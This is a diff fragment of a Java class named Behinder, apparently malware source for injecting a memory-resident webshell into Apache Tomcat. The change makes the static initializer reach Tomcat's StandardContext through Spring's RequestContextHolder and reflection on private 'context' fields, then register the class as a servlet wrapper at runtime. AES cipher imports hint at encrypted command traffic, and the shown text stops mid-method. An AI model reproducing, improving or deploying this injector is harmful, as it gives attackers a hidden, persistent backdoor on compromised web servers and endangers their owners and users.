@@ -1,7 +1,10 @@
 import org.apache.catalina.Container;
 import org.apache.catalina.Wrapper;
+import org.apache.catalina.core.ApplicationContext;
 import org.apache.catalina.core.StandardContext;
 import org.apache.catalina.loader.WebappClassLoaderBase;
+import org.springframework.web.context.request.RequestContextHolder;
+import org.springframework.web.context.request.ServletRequestAttributes;
 
 import javax.crypto.Cipher;
 import javax.crypto.spec.SecretKeySpec;
@@ -11,6 +14,7 @@ import javax.servlet.http.HttpServletResponse;
 import javax.servlet.http.HttpSession;
 import java.io.IOException;
 import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
 import java.lang.reflect.Method;
 import java.util.HashMap;
 import java.util.Map;
@@ -23,8 +27,15 @@ public class Behinder implements Servlet {
     static {
         try {
             //以下代码就是动态注册一个wrapper
-            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
-            StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();
+            ServletRequestAttributes attributes = (ServletRequestAttributes) RequestContextHolder.getRequestAttributes();
+            HttpServletRequest request = attributes.getRequest();
+            ServletContext servletContext = request.getServletContext();
+            Field appctx = servletContext.getClass().getDeclaredField("context");
+            appctx.setAccessible(true);
+            ApplicationContext applicationContext= (ApplicationContext)appctx.get(servletContext);
+            Field stdctx = applicationContext.getClass().getDeclaredField("context");
+            stdctx.setAccessible(true);
+            StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
             Behinder behinderServlet = new Behinder();
             Method createWrapper = Class.forName("org.apache.catalina.core.StandardContext").getDeclaredMethod("createWrapper");
             Wrapper greetWrapper = (Wrapper) createWrapper.invoke(standardContext);
